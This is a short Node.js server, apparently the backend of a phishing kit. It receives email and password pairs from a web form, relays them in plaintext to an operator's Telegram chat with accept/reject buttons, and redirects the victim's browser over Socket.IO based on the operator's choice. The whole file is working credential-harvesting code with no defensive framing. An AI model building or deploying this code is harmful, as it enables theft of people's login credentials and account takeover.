const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config(); // Asegúrate de tener TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID en tu .env

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

app.use(express.static('public'));
app.use(express.json()); // Necesario para leer JSON del body

let currentSocket = null;

// Conexión de Socket.IO
io.on('connection', (socket) => {
  console.log('🟢 Cliente conectado vía Socket.IO');
  currentSocket = socket;
});

// Ruta POST desde el formulario del navegador
app.post('/enviar', (req, res) => {
  const { usuario, clave } = req.body;

  console.log('📩 Datos recibidos:', usuario, clave);

  const mensaje = `🔐 Nuevo intento de acceso:\nCorreo: ${usuario}\nContraseña: ${clave}`;

  bot.sendMessage(process.env.TELEGRAM_CHAT_ID, mensaje, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
      ]
    }
  });

  res.status(200).json({ success: true });
});

// Telegram responde al botón
bot.on('callback_query', (callbackQuery) => {
  const action = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;

  if (action === 'aceptar') {
    bot.sendMessage(chatId, '🟢 ¡Acceso aprobado!');
    if (currentSocket) {
      currentSocket.emit('redirect', '/bienvenido.html');
    }
  } else if (action === 'rechazar') {
    bot.sendMessage(chatId, '🔴 Acceso denegado.');
    if (currentSocket) {
      currentSocket.emit('redirect', '/denegado.html');
    }
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
